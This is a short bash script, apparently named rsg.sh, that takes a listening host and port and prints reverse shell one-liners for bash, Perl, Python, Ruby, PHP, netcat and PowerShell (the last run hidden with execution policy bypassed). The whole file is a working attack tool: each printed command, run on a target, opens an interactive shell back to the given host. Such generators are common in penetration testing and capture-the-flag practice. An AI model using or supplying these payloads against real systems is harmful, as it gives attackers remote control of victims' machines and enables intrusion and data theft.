#!/usr/bin/env bash

print_usage() {
	echo "rsg.sh usage:"
	echo "$0 <LHOST> <LPORT>"
}


if [ $# -ne 2 ]; then
	print_usage
	exit 1
fi

echo -e "Listing reverse shell payloads for LHOST=\e[1;31m$1 \e[0mand LPORT=\e[1;31m$2\e[0m"
echo -n -e "\e[1;32mBASH: \e[0m"
echo "bash -i >& /dev/tcp/$1/$2 0>&1"

echo -n -e "\e[1;32mBASH #2: \e[0m"
echo "0<&196;exec 196<>/dev/tcp/$1/$2; sh <&196 >&196 2>&196"

echo -n -e "\e[1;32mPERL: \e[0m"
echo "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($2,inet_aton(\"$1\")))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

echo -n -e "\e[1;32mPERL #2: \e[0m"
echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$2\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"

echo -n -e "\e[1;32mPYTHON: \e[0m"
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

echo -n -e "\e[1;32mRUBY: \e[0m"
echo "ruby -rsocket -e'f=TCPSocket.open(\"$1\",$2).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

echo -n -e "\e[1;32mRUBY #2: \e[0m"
echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$1\",\"$2\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

echo -n -e "\e[1;32mPHP: \e[0m"
echo "php -r '\$sock=fsockopen(\"$1\",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo -n -e "\e[1;32mNC: \e[0m"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"

echo -n -e "\e[1;32mPOWERSHELL: \e[0m"
echo "powershell -NoP -NonI -W Hidden -ep bypass -c New-Object System.Net.Sockets.TCPClient(\"$1\",$2);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
